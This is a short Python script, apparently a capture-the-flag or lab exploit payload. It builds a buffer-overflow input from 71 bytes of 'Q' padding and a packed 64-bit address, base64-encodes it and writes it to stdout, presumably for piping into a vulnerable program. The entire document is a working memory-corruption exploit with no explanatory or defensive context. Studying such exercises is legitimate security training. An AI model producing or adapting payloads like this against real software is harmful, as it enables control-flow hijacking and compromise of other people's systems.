
import sys
import struct
import base64

buf = b'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ'
buf += struct.pack('<Q', 15548556403616035312)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
